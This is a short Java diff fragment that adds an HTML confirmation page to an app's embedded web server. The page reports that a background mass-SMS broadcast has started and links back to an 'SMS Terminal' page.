+        String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-orange);\">&#9889;</div><h2>Broadcast Initiated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>The mass-messaging sequence has been deployed in the background.</p><p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">Check Terminal logs for real-time progress.</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">Back to SMS Terminal</a></div></div></div>" + HTML_FOOTER;
         return newFixedLengthResponse(Response.Status.OK, "text/html", html);
     }
 
